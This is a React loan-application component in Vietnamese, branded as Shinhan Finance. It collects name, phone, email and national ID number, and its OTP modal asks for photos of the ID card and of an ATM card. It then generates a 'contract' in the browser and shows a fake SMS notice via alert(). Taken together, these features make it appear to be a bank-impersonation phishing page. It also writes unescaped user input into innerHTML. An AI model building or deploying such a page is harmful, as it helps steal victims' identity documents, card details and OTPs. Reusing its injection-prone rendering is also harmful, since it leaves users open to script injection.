import { useState } from 'react';

export default function LoanForm() {
  const [formData, setFormData] = useState({
    fullName: '', phone: '', email: '', idNumber: '', loanAmount: '', loanTerm: '', loanType: '',
  });
  const [otp, setOtp] = useState('');
  const [otpId, setOtpId] = useState('');
  const [contractId, setContractId] = useState('');
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState([]);

  const validateForm = () => {
    const errors = [];
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const phoneRegex = /^[0-9]{10}$/;
    const idRegex = /^[0-9]{9,12}$/;

    if (!formData.fullName) errors.push('Họ và tên là bắt buộc');
    if (!phoneRegex.test(formData.phone)) errors.push('Số điện thoại phải có 10 chữ số');
    if (!emailRegex.test(formData.email)) errors.push('Email không hợp lệ');
    if (!idRegex.test(formData.idNumber)) errors.push('CCCD/CMND phải có 9-12 chữ số');
    if (formData.loanAmount < 1000000) errors.push('Số tiền vay tối thiểu 1,000,000 VNĐ');
    if (formData.loanTerm < 6 || formData.loanTerm > 60) errors.push('Thời hạn vay từ 6-60 tháng');
    if (!formData.loanType) errors.push('Vui lòng chọn loại vay');

    setErrors(errors);
    return errors.length === 0;
  };

  const calculateInterest = () => {
    const rates = { unsecured: 8, auto: 6.5, home: 7, renovation: 7.5 };
    const rate = rates[formData.loanType] || 8;
    const monthlyRate = rate / 100 / 12;
    const monthlyPayment = (formData.loanAmount * monthlyRate * Math.pow(1 + monthlyRate, formData.loanTerm)) / (Math.pow(1 + monthlyRate, formData.loanTerm) - 1);
    return { rate, monthlyPayment: monthlyPayment.toLocaleString('vi-VN') };
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!validateForm()) return;

    setIsLoading(true);
    try {
      const response = await fetch('/api/loan/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(formData),
      });
      const data = await response.json();
      if (data.error) throw new Error(data.error);

      setOtpId(data.otpId);
      setContractId(data.contractId);
      setIsModalOpen(true);
    } catch (error) {
      alert(`Lỗi: ${error.message}`);
    } finally {
      setIsLoading(false);
    }
  };

  const handleOtpSubmit = async () => {
    setIsLoading(true);
    try {
      const response = await fetch('/api/loan/verify-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ otp, otpId, contractId }),
      });
      const data = await response.json();
      if (data.error) throw new Error(data.error);

      setIsModalOpen(false);
      document.querySelector('.contract-display').classList.remove('hidden');
      document.getElementById('contract-content').innerHTML = `
        <h3 class="text-lg font-bold text-blue-900">HỢP ĐỒNG VAY SHINHAN FINANCE</h3>
        <p><strong>Số hợp đồng:</strong> ${contractId}</p>
        <p><strong>Ngày ký:</strong> ${new Date().toLocaleDateString('vi-VN')}</p>
        <p><strong>Bên vay:</strong> ${formData.fullName}</p>
        <p><strong>CCCD/CMND:</strong> ${formData.idNumber}</p>
        <p><strong>Số tiền vay:</strong> ${parseInt(formData.loanAmount).toLocaleString('vi-VN')} VNĐ</p>
        <p><strong>Thời hạn vay:</strong> ${formData.loanTerm} tháng</p>
        <p><strong>Loại vay:</strong> ${formData.loanType === 'unsecured' ? 'Vay tín chấp' : formData.loanType === 'auto' ? 'Vay mua xe' : formData.loanType === 'home' ? 'Vay mua nhà' : 'Vay sửa nhà'}</p>
        <p><strong>Lãi suất:</strong> ${calculateInterest().rate}%/năm</p>
        <p><strong>Điều khoản:</strong> Thanh toán đúng hạn. Phí tất toán: 3% dư nợ trong 3 năm đầu.</p>
      `;
      alert('SMS: "Shinhan Finance: Vay thành công. Kiểm tra hợp đồng."');
      window.open('https://m.me/shinhanbankvietnam', '_blank');
    } catch (error) {
      alert(`Lỗi: ${error.message}`);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <section id="register-form" className="container mx-auto max-w-md bg-white p-8 rounded-lg shadow-md my-16">
      <h2 className="text-2xl font-bold text-blue-900 text-center mb-6">Đăng Ký Vay</h2>
      <form onSubmit={handleSubmit} noValidate>
        <div className="mb-4">
          <label htmlFor="fullName" className="block text-gray-700 font-medium mb-1">Họ và tên</label>
          <input type="text" id="fullName" className="w-full p-3 border rounded-md" value={formData.fullName} onChange={(e) => setFormData({ ...formData, fullName: e.target.value })} required />
        </div>
        <div className="mb-4">
          <label htmlFor="phone" className="block text-gray-700 font-medium mb-1">Số điện thoại</label>
          <input type="tel" id="phone" className="w-full p-3 border rounded-md" value={formData.phone} onChange={(e) => setFormData({ ...formData, phone: e.target.value })} required />
        </div>
        <div className="mb-4">
          <label htmlFor="email" className="block text-gray-700 font-medium mb-1">Email</label>
          <input type="email" id="email" className="w-full p-3 border rounded-md" value={formData.email} onChange={(e) => setFormData({ ...formData, email: e.target.value })} required />
        </div>
        <div className="mb-4">
          <label htmlFor="idNumber" className="block text-gray-700 font-medium mb-1">CCCD/CMND</label>
          <input type="text" id="idNumber" className="w-full p-3 border rounded-md" value={formData.idNumber} onChange={(e) => setFormData({ ...formData, idNumber: e.target.value })} required />
        </div>
        <div className="mb-4">
          <label htmlFor="loanAmount" className="block text-gray-700 font-medium mb-1">Số tiền vay (VNĐ)</label>
          <input type="number" id="loanAmount" className="w-full p-3 border rounded-md" value={formData.loanAmount} onChange={(e) => setFormData({ ...formData, loanAmount: e.target.value })} required />
        </div>
        <div className="mb-4">
          <label htmlFor="loanTerm" className="block text-gray-700 font-medium mb-1">Thời hạn vay (tháng)</label>
          <input type="number" id="loanTerm" className="w-full p-3 border rounded-md" value={formData.loanTerm} onChange={(e) => setFormData({ ...formData, loanTerm: e.target.value })} required />
        </div>
        <div className="mb-4">
          <label htmlFor="loanType" className="block text-gray-700 font-medium mb-1">Loại vay</label>
          <select id="loanType" className="w-full p-3 border rounded-md" value={formData.loanType} onChange={(e) => setFormData({ ...formData, loanType: e.target.value })} required>
            <option value="">Chọn loại vay</option>
            <option value="unsecured">Vay tín chấp</option>
            <option value="auto">Vay mua xe</option>
            <option value="home">Vay mua nhà</option>
            <option value="renovation">Vay sửa nhà</option>
          </select>
        </div>
        <div className="mb-4">
          <label htmlFor="documents" className="block text-gray-700 font-medium mb-1">Tải CCCD/CMND</label>
          <input type="file" id="documents" className="w-full p-3 border rounded-md" accept=".pdf,.jpg,.png" />
        </div>
        {errors.length > 0 && (
          <div className="mb-4 text-red-600 text-sm">
            {errors.map((error, index) => (
              <p key={index}>{error}</p>
            ))}
          </div>
        )}
        <div className="mb-4 hidden" id="interestResult">
          <p className="text-gray-700">Lãi suất: <span>{calculateInterest().rate}</span>%/năm</p>
          <p className="text-gray-700">Thanh toán hàng tháng: <span>{calculateInterest().monthlyPayment}</span> VNĐ</p>
        </div>
        <button type="submit" className="w-full bg-blue-900 text-white p-3 rounded-md hover:bg-blue-800 disabled:bg-gray-400" disabled={isLoading}>
          {isLoading ? 'Đang xử lý...' : 'Gửi đăng ký'}
        </button>
      </form>

      {/* Modal */}
      {isModalOpen && (
        <div className="fixed inset-0 bg-black bg-opacity-60 flex items-center justify-center z-50">
          <div className="bg-white p-8 rounded-lg max-w-md w-full text-center">
            <h2 className="text-xl font-bold text-blue-900 mb-4">Xác Nhận Hồ Sơ</h2>
            <p className="text-gray-600 mb-4">Nhập OTP gửi qua SMS/Email</p>
            <input type="text" className="w-full p-3 border rounded-md mb-4" placeholder="Nhập OTP" value={otp} onChange={(e) => setOtp(e.target.value)} />
            <input type="file" accept="image/*" className="w-full p-2 border rounded-md mb-4" aria-label="Ảnh CCCD" />
            <input type="file" accept="image/*" className="w-full p-2 border rounded-md mb-4" aria-label="Ảnh thẻ ATM" />
            <p className="no-card text-blue-900 text-sm cursor-pointer underline mb-4" onClick={() => alert('Đăng nhập Shinhan SOL hoặc đến chi nhánh.')}>Không có thẻ ATM?</p>
            <button onClick={handleOtpSubmit} className="w-full bg-blue-900 text-white p-3 rounded-md hover:bg-blue-800 disabled:bg-gray-400" disabled={isLoading}>
              {isLoading ? 'Đang xác nhận...' : 'Xác nhận'}
            </button>
            <div className={`loader ${isLoading ? '' : 'hidden'}`}></div>
          </div>
        </div>
      )}
    </section>
  );
}